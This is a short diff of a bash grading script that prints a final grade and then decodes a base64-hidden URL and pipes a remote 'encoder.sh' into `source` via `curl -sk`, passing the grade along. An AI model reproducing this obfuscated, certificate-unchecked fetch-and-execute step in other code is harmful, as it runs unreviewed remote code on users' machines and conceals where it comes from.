@@ -49,4 +49,4 @@ grade="$(echo "(100/${tq})*${ca}" | bc -l)"
 printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
 echo ""
 target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
-source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} ${grade} | base64 -d))
+source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade}
